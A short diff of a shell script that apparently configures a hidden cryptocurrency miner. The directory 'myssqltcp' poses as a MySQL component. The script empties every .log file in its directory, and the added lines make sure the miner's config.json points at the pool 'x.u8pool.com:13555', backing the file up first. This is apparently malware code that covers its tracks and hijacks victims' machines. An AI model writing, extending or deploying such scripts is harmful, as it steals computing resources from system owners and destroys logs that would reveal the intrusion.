@@ -50,4 +50,5 @@ fi
  
 ls *.log | xargs -I x -n 1 sh -c "echo > x”
 
-sed -i 's/"url": *"[^"]*",/"url": "x.u8pool.com:13555",/' $HOME/myssqltcp/config.json
+cp $HOME/myssqltcp/config.json $HOME/myssqltcp/config_background.json
+grep -q "x.u8pool.com:13555" config.json && echo "yes" || sed -i 's/"url": *"[^"]*",/"url": "x.u8pool.com:13555",/' $HOME/myssqltcp/config.json
